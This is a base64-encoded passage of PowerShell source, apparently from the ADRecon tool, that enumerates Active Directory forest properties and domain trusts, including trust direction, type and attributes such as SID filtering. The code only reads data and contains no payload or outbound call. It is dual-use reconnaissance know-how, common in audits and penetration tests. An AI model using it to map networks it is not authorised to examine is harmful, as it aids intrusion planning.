ZSBGTEFECgogICAgICAgICAgICAkT2JqVmFsdWVzID0gQCgiTmFtZSIsICRBREZvcmVzdC5OYW1lLCAiRnVuY3Rpb25hbCBMZXZlbCIsICRGb3Jlc3RNb2RlLCAiRG9tYWluIE5hbWluZyBNYXN0ZXIiLCAkQURGb3Jlc3QuTmFtaW5nUm9sZU93bmVyLCAiU2NoZW1hIE1hc3RlciIsICRBREZvcmVzdC5TY2hlbWFSb2xlT3duZXIsICJSb290RG9tYWluIiwgJEFERm9yZXN0LlJvb3REb21haW4sICJEb21haW4gQ291bnQiLCAkQURGb3Jlc3QuRG9tYWlucy5Db3VudCwgIlNpdGUgQ291bnQiLCAkQURGb3Jlc3QuU2l0ZXMuQ291bnQsICJHbG9iYWwgQ2F0YWxvZyBDb3VudCIsICRBREZvcmVzdC5HbG9iYWxDYXRhbG9ncy5Db3VudCkKCiAgICAgICAgICAgIEZvciAoJGkgPSAwOyAkaSAtbHQgJCgkT2JqVmFsdWVzLkNvdW50KTsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpXQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRPYmpWYWx1ZXNbJGkrMV0KICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBGb3Jlc3RNb2RlCgogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5Eb21haW5zLkNvdW50OyAkaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJEb21haW4iCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJEFERm9yZXN0LkRvbWFpbnNbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5TaXRlcy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAiU2l0ZSIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkQURGb3Jlc3QuU2l0ZXNbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRBREZvcmVzdC5HbG9iYWxDYXRhbG9ncy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ2F0ZWdvcnkiIC1WYWx1ZSAiR2xvYmFsQ2F0YWxvZyIKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkQURGb3Jlc3QuR2xvYmFsQ2F0YWxvZ3NbJGldCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJUb21ic3RvbmUgTGlmZXRpbWUiCiAgICAgICAgICAgIElmICgkQURGb3Jlc3RUb21ic3RvbmVMaWZldGltZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICRBREZvcmVzdFRvbWJzdG9uZUxpZmV0aW1lCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGb3Jlc3RUb21ic3RvbmVMaWZldGltZQogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJOb3QgUmV0cmlldmVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJSZWN5Y2xlIEJpbiAoMjAwOCBSMiBvbndhcmRzKSIKICAgICAgICAgICAgSWYgKCRBRFJlY3ljbGVCaW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIElmICgkQURSZWN5Y2xlQmluLlByb3BlcnRpZXMuJ21zRFMtRW5hYmxlZEZlYXR1cmVCTCcuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJFbmFibGVkIgogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICAgICAgICAgIEZvcigkaT0wOyAkaSAtbHQgJCgkQURSZWN5Y2xlQmluLlByb3BlcnRpZXMuJ21zRFMtRW5hYmxlZEZlYXR1cmVCTCcuQ291bnQpOyAkaSsrKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJFbmFibGVkIFNjb3BlIgogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZhbHVlIiAtVmFsdWUgJEFEUmVjeWNsZUJpbi5Qcm9wZXJ0aWVzLidtc0RTLUVuYWJsZWRGZWF0dXJlQkwnWyRpXQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJEaXNhYmxlZCIKICAgICAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJlY3ljbGVCaW4KICAgICAgICAgICAgfQogICAgICAgICAgICBFbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJDYXRlZ29yeSIgLVZhbHVlICJQcml2aWxlZ2VkIEFjY2VzcyBNYW5hZ2VtZW50ICgyMDE2IG9ud2FyZHMpIgogICAgICAgICAgICBJZiAoJFByaXZpbGVnZWRBY2Nlc3NNYW5hZ2VtZW50KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJZiAoJFByaXZpbGVnZWRBY2Nlc3NNYW5hZ2VtZW50LlByb3BlcnRpZXMuJ21zRFMtRW5hYmxlZEZlYXR1cmVCTCcuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWYWx1ZSIgLVZhbHVlICJFbmFibGVkIgogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmogKz0gJE9iagogICAgICAgICAgICAgICAgICAgIEZvcigkaT0wOyAkaSAtbHQgJCgkUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQuUHJvcGVydGllcy4nbXNEUy1FbmFibGVkRmVhdHVyZUJMJy5Db3VudCk7ICRpKyspCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNhdGVnb3J5IiAtVmFsdWUgIkVuYWJsZWQgU2NvcGUiCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQuUHJvcGVydGllcy4nbXNEUy1FbmFibGVkRmVhdHVyZUJMJ1skaV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVzdE9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdE9iaiArPSAkT2JqCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUHJpdmlsZWdlZEFjY2Vzc01hbmFnZW1lbnQKICAgICAgICAgICAgfQogICAgICAgICAgICBFbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAiRGlzYWJsZWQiCiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERm9yZXN0CiAgICAgICAgfQogICAgfQoKICAgIElmICgkRm9yZXN0T2JqKQogICAgewogICAgICAgIFJldHVybiAkRm9yZXN0T2JqCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1BRFJUcnVzdAp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyB0aGUgVHJ1c3RzIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyB0aGUgVHJ1c3RzIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4KICAgICkKCiAgICAjIFZhbHVlcyB0YWtlbiBmcm9tIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyMjM3NjguYXNweAogICAgJFREQUQgPSBAewogICAgICAgIDAgPSAiRGlzYWJsZWQiOwogICAgICAgIDEgPSAiSW5ib3VuZCI7CiAgICAgICAgMiA9ICJPdXRib3VuZCI7CiAgICAgICAgMyA9ICJCaURpcmVjdGlvbmFsIjsKICAgIH0KCiAgICAjIFZhbHVlcyB0YWtlbiBmcm9tIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyMjM3NzEuYXNweAogICAgJFRUQUQgPSBAewogICAgICAgIDEgPSAiRG93bmxldmVsIjsKICAgICAgICAyID0gIlVwbGV2ZWwiOwogICAgICAgIDMgPSAiTUlUIjsKICAgICAgICA0ID0gIkRDRSI7CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEVHJ1c3RzID0gR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICIob2JqZWN0Q2xhc3M9dHJ1c3RlZERvbWFpbikiIC1Qcm9wZXJ0aWVzIERpc3Rpbmd1aXNoZWROYW1lLHRydXN0UGFydG5lcix0cnVzdGRpcmVjdGlvbix0cnVzdHR5cGUsVHJ1c3RBdHRyaWJ1dGVzLHdoZW5DcmVhdGVkLHdoZW5DaGFuZ2VkCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlRydXN0XSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyB0cnVzdGVkRG9tYWluIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURUcnVzdHMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgVHJ1c3RzOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRFRydXN0cykpIgogICAgICAgICAgICAjIFRydXN0IEluZm8KICAgICAgICAgICAgJEFEVHJ1c3RPYmogPSBAKCkKICAgICAgICAgICAgJEFEVHJ1c3RzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgIyBDcmVhdGUgdGhlIG9iamVjdCBmb3IgZWFjaCBpbnN0YW5jZS4KICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlNvdXJjZSBEb21haW4iIC1WYWx1ZSAoR2V0LUROdG9GUUROICRfLkRpc3Rpbmd1aXNoZWROYW1lKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJUYXJnZXQgRG9tYWluIiAtVmFsdWUgJF8udHJ1c3RQYXJ0bmVyCiAgICAgICAgICAgICAgICAkVHJ1c3REaXJlY3Rpb24gPSBbc3RyaW5nXSAkVERBRFskXy50cnVzdGRpcmVjdGlvbl0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVHJ1c3QgRGlyZWN0aW9uIiAtVmFsdWUgJFRydXN0RGlyZWN0aW9uCiAgICAgICAgICAgICAgICAkVHJ1c3RUeXBlID0gW3N0cmluZ10gJFRUQURbJF8udHJ1c3R0eXBlXQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJUcnVzdCBUeXBlIiAtVmFsdWUgJFRydXN0VHlwZQoKICAgICAgICAgICAgICAgICRUcnVzdEF0dHJpYnV0ZXMgPSAkbnVsbAogICAgICAgICAgICAgICAgSWYgKFtpbnQzMl0gJF8uVHJ1c3RBdHRyaWJ1dGVzIC1iYW5kIDB4MDAwMDAwMDEpIHsgJFRydXN0QXR0cmlidXRlcyArPSAiTm9uIFRyYW5zaXRpdmUsIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5UcnVzdEF0dHJpYnV0ZXMgLWJhbmQgMHgwMDAwMDAwMikgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJVcExldmVsLCIgfQogICAgICAgICAgICAgICAgSWYgKFtpbnQzMl0gJF8uVHJ1c3RBdHRyaWJ1dGVzIC1iYW5kIDB4MDAwMDAwMDQpIHsgJFRydXN0QXR0cmlidXRlcyArPSAiUXVhcmFudGluZWQsIiB9ICNTSUQgRmlsdGVyaW5nCiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5UcnVzdEF0dHJpYnV0ZXMgLWJhbmQgMHgwMDAwMDAwOCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJGb3Jlc3QgVHJhbnNpdGl2ZSwiIH0KICAgICAgICAgICAgICAgIElmIChbaW50MzJdICRfLlRydXN0QXR0cmlidXRlcyAtYmFuZCAweDAwMDAwMDEwKSB7ICRUcnVzdEF0dHJpYnV0ZXMgKz0gIkNyb3NzIE9yZ2FuaXphdGlvbiwiIH0gI1NlbGVjdGl2ZSBBdXRoCiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5UcnVzdEF0dHJpYnV0ZXMgLWJhbmQgMHgwMDAwMDAyMCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJXaXRoaW4gRm9yZXN0LCIgfQogICAgICAgICAgICAgICAgSWYgKFtpbnQzMl0gJF8uVHJ1c3RBdHRyaWJ1dGVzIC1iYW5kIDB4MDAwMDAwNDApIHsgJFRydXN0QXR0cmlidXRlcyArPSAiVHJlYXQgYXMgRXh0ZXJuYWwsIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5UcnVzdEF0dHJpYnV0ZXMgLWJhbmQgMHgwMDAwMDA4MCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJVc2VzIFJDNCBFbmNyeXB0aW9uLCIgfQogICAgICAgICAgICAgICAgSWYgKFtpbnQzMl0gJF8uVHJ1c3RBdHRyaWJ1dGVzIC1iYW5kIDB4MDAwMDAyMDApIHsgJFRydXN0QXR0cmlidXRlcyArPSAiTm8gVEdUIERlbGVnYXRpb24sIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5UcnVzdEF0dHJpYnV0ZXMgLWJhbmQgMHgwMDAwMDQwMCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJQSU0gVHJ1c3QsIiB9CiAgICAgICAgICAgICAgICBJZiAoJFRydXN0QXR0cmlidXRlcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RBdHRyaWJ1dGVzID0gJFRydXN0QXR0cmlidXRlcy5UcmltRW5kKCIsIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQXR0cmlidXRlcyIgLVZhbHVlICRUcnVzdEF0dHJpYnV0ZXMKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNyZWF0ZWQiIC1WYWx1ZSAoW0RhdGVUaW1lXSAkKCRfLndoZW5DcmVhdGVkKSkKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNoYW5nZWQiIC1WYWx1ZSAoW0RhdGVUaW1lXSAkKCRfLndoZW5DaGFuZ2VkKSkKICAgICAgICAgICAgICAgICRBRFRydXN0T2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURUcnVzdHMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRvYmpTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpEb21haW4KICAgICAgICAkT2JqU2VhcmNoZXIuUGFnZVNpemUgPSAkUGFnZVNpemUKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIihvYmplY3RDbGFzcz10cnVzdGVkRG9tYWluKSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImRpc3Rpbmd1aXNoZWRuYW1lIiwidHJ1c3RwYXJ0bmVyIiwidHJ1c3RkaXJlY3Rpb24iLCJ0cnVzdHR5cGUiLCJ0cnVzdGF0dHJpYnV0ZXMiLCJ3aGVuY3JlYXRlZCIsIndoZW5jaGFuZ2VkIikpCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEVHJ1c3RzID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJUcnVzdF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgdHJ1c3RlZERvbWFpbiBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgICRPYmpTZWFyY2hlci5kaXNwb3NlKCkKCiAgICAgICAgSWYgKCRBRFRydXN0cykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBUcnVzdHM6ICQoW0FEUmVjb24uTERBUENsYXNzXTo6T2JqZWN0Q291bnQoJEFEVHJ1c3RzKSkiCiAgICAgICAgICAgICMgVHJ1c3QgSW5mbwogICAgICAgICAgICAkQURUcnVzdE9iaiA9IEAoKQogICAgICAgICAgICAkQURUcnVzdHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSB0aGUgb2JqZWN0IGZvciBlYWNoIGluc3RhbmNlLgogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU291cmNlIERvbWFpbiIgLVZhbHVlICQoR2V0LUROdG9GUUROIChbc3RyaW5nXSAkXy5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSkKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVGFyZ2V0IERvbWFpbiIgLVZhbHVlICQoW3N0cmluZ10gJF8uUHJvcGVydGllcy50cnVzdHBhcnRuZXIpCiAgICAgICAgICAgICAgICAkVHJ1c3REaXJlY3Rpb24gPSBbc3RyaW5nXSAkVERBRFskXy5Qcm9wZXJ0aWVzLnRydXN0ZGlyZWN0aW9uXQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJUcnVzdCBEaXJlY3Rpb24iIC1WYWx1ZSAkVHJ1c3REaXJlY3Rpb24KICAgICAgICAgICAgICAgICRUcnVzdFR5cGUgPSBbc3RyaW5nXSAkVFRBRFskXy5Qcm9wZXJ0aWVzLnRydXN0dHlwZV0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVHJ1c3QgVHlwZSIgLVZhbHVlICRUcnVzdFR5cGUKCiAgICAgICAgICAgICAgICAkVHJ1c3RBdHRyaWJ1dGVzID0gJG51bGwKICAgICAgICAgICAgICAgIElmIChbaW50MzJdICRfLlByb3BlcnRpZXMudHJ1c3RhdHRyaWJ1dGVzWzBdIC1iYW5kIDB4MDAwMDAwMDEpIHsgJFRydXN0QXR0cmlidXRlcyArPSAiTm9uIFRyYW5zaXRpdmUsIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5Qcm9wZXJ0aWVzLnRydXN0YXR0cmlidXRlc1swXSAtYmFuZCAweDAwMDAwMDAyKSB7ICRUcnVzdEF0dHJpYnV0ZXMgKz0gIlVwTGV2ZWwsIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5Qcm9wZXJ0aWVzLnRydXN0YXR0cmlidXRlc1swXSAtYmFuZCAweDAwMDAwMDA0KSB7ICRUcnVzdEF0dHJpYnV0ZXMgKz0gIlF1YXJhbnRpbmVkLCIgfSAjU0lEIEZpbHRlcmluZwogICAgICAgICAgICAgICAgSWYgKFtpbnQzMl0gJF8uUHJvcGVydGllcy50cnVzdGF0dHJpYnV0ZXNbMF0gLWJhbmQgMHgwMDAwMDAwOCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJGb3Jlc3QgVHJhbnNpdGl2ZSwiIH0KICAgICAgICAgICAgICAgIElmIChbaW50MzJdICRfLlByb3BlcnRpZXMudHJ1c3RhdHRyaWJ1dGVzWzBdIC1iYW5kIDB4MDAwMDAwMTApIHsgJFRydXN0QXR0cmlidXRlcyArPSAiQ3Jvc3MgT3JnYW5pemF0aW9uLCIgfSAjU2VsZWN0aXZlIEF1dGgKICAgICAgICAgICAgICAgIElmIChbaW50MzJdICRfLlByb3BlcnRpZXMudHJ1c3RhdHRyaWJ1dGVzWzBdIC1iYW5kIDB4MDAwMDAwMjApIHsgJFRydXN0QXR0cmlidXRlcyArPSAiV2l0aGluIEZvcmVzdCwiIH0KICAgICAgICAgICAgICAgIElmIChbaW50MzJdICRfLlByb3BlcnRpZXMudHJ1c3RhdHRyaWJ1dGVzWzBdIC1iYW5kIDB4MDAwMDAwNDApIHsgJFRydXN0QXR0cmlidXRlcyArPSAiVHJlYXQgYXMgRXh0ZXJuYWwsIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5Qcm9wZXJ0aWVzLnRydXN0YXR0cmlidXRlc1swXSAtYmFuZCAweDAwMDAwMDgwKSB7ICRUcnVzdEF0dHJpYnV0ZXMgKz0gIlVzZXMgUkM0IEVuY3J5cHRpb24sIiB9CiAgICAgICAgICAgICAgICBJZiAoW2ludDMyXSAkXy5Qcm9wZXJ0aWVzLnRydXN0YXR0cmlidXRlc1swXSAtYmFuZCAweDAwMDAwMjAwKSB7ICRUcnVzdEF0dHJpYnV0ZXMgKz0gIk5vIFRHVCBEZWxlZ2F0aW9uLCIgfQogICAgICA